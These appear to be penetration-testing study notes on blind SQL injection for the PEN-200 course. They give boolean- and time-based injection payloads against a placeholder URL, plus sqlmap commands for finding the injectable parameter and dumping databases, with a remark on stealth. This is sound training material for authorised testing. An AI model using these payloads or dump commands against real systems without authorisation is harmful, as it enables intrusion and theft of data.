# Blind SQLi — Boolean & Time-Based

Blind SQLi means the database result itself is not directly returned. Infer TRUE/FALSE from **application behavior** or **response time**.

## Boolean-based blind SQLi

Compare a condition that is always true with one that is false:

```text
http://target/page.php?user=offsec' AND 1=1 -- //
http://target/page.php?user=offsec' AND 1=2 -- //
```

If the page predictably changes between the TRUE and FALSE conditions, the behavior can be used to enumerate data one condition at a time.

> The visible signal comes from the web application's behavior, not direct database output.

## Time-based blind SQLi

Use a conditional delay:

```text
http://target/page.php?user=offsec' AND IF(1=1,sleep(3),'false') -- //
```

If the TRUE condition consistently delays the response by about three seconds, the result can be inferred from timing.

## sqlmap

```bash
# Let sqlmap identify the vulnerable parameter / technique
sqlmap -u "http://<IP>/blindsqli.php?user=1" -p user

# Dump reachable data
sqlmap -u "http://<IP>/blindsqli.php?user=1" -p user --dump

# Force time-based testing when appropriate
sqlmap -u "http://<IP>/page.php?id=1" -p id --technique=T --level=3 --dbs
```

Time-based extraction can be very slow because each bit/value is inferred from response delays. PEN-200 uses sqlmap to automate this process.

## Remember

- Boolean blind: **page behavior** reveals TRUE/FALSE.
- Time blind: **response delay** reveals TRUE/FALSE.
- Confirm the parameter manually before relying on automation.
- `sqlmap` is high-volume/noisy, so do not treat it as the first choice when stealth matters.
